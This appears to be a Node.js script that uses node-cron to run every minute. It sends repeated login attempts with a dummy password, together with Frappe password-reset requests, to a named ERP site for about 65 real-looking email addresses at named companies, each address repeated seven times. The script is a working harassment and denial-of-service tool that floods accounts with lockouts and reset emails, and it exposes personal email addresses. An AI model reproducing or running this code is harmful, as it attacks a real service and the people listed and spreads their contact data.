var request = require('request');
var cron = require('node-cron');


cron.schedule('* * * * *', function () {
    console.log('running a task every minute');
    run();
});

function run() {

    var userMainList = [
        'Administrator',
        'danny@dosharon.co.za',
        'danny@actsys.co.za',
        'danny@sameng.co.za',
        'info@mmcargoservices.co.za',
        'accounts@mmcargoservices.co.za',
        'admin@mmcargoservices.co.za',
        'agatha@mmcargoservices.co.za',
        'accounts@mmcargoservices.co.za',
        'admin@mmcargoservices.co.za   ',
        'agatha@mmcargoservices.co.za  ',
        'Albert.VanWinkel@cummins.com  ',
        'ammalizest@rutherford.co.za   ',
        'bahati@mmcargoservices.co.za  ',
        'barry@mmpboksburg.co.za',
        'basechemicalsm&sservicescommunication@sasol.com',
        'charl.gammelin@draeger.com',
        'charles@mmcargoservices.co.za ',
        'courtney@hammon.co.za',
        'donovan@stmmining.co.za',
        'eliah.bebeda@cummins.com',
        'ephraemm.mocheko@sulzer.com',
        'eric@mmcargoservices.co.za',
        'frank.tshetlha@cummins.com',
        'Gibson.Habe@cummins.com',
        'greg.davies@cummins.com',
        'groupcommunications@aeci.co.za',
        'hilton.mohammed@trysome.cc',
        'info@mmcargoservices.co.za',
        'info@mmscranes.co.za',
        'info@ssemmthembu.co.za',
        'info@ummac.co.za',
        'jbittmann@memmert.com',
        'joseph@mmcargoservices.co.za',
        'marketing@mmc.co.za',
        'mash@mmcargoservices.co.za',
        'maureen@mmcargoservices.co.za',
        'minathi.mnguni@cummins.com',
        'mm.cargoservices.sa@gmail.com',
        'mmashilo@cargomotors.co.za',
        'mmolahlehi@fowkes.co.za',
        'mohammed@jdl.co.za',
        'nf881@cummins.com',
        'oliver@mmcargoservices.co.za',
        'pamj@agrisacommodities.co.za',
        'perfect@mmcargoservices.co.za',
        'phillip@mmcargoservices.co.za',
        'quotes@mmcargoservices.co.za',
        'reg.kalian@dnmmining.com    ',
        'richard@mmcargoservices.co.za',
        'rommeadowpoint@pandlhardware.co.za',
        'sales@communicagroup.com',
        'sales@mmcargoservices.co.za',
        'sales@nwdamme.co.za',
        'sales@tamm.co.za',
        'sales@ummac.co.za',
        'sales1@mmformwork.co.za',
        'sales1@rmmgroup.co.za',
        'sales2@mmcargoservices.co.za',
        'shaun@acecomms.co.za',
        'stock@mmcs.com',
        'tammy@btapipejhb.co.za',
        'tammy@processvalve.co.za',
        'thandeka@mmcargoservices.co.za',
        'transport@mmcargoservices.co.za'
    ];

    var userList = [...userMainList, ...userMainList, ...userMainList, ...userMainList, ...userMainList, ...userMainList, ...userMainList];

    setTimeout(function () {
        for (var user of userList) {
            customRequest(user);
            customRequest2(user);
        }
    }, 100);
}



function customRequest(user) {
    try {
        request.post(
            'https://erp.danzasolutions.com',
            {
                json: {
                    "cmd": "login",
                    "usr": user.trim(),
                    "pwd": "asd",
                    "device": "desktop"
                }
            },
            function (error, response, body) {
                console.log(`Login for User: ${user.trim()}`);
                // console.log(response.body.message);
            }
        );
    } catch (e) {

    }

}

function customRequest2(user) {
    try {
        request.post(
            'https://erp.danzasolutions.com',
            {
                json: {
                    "cmd": "frappe.core.doctype.user.user.reset_password",
                    "user": user.trim(),
                }
            },
            function (error, response, body) {
                console.log(` Resetting password User: ${user.trim()}`);
                //console.log(response.body);
            }
        );
    } catch (e) {

    }

}





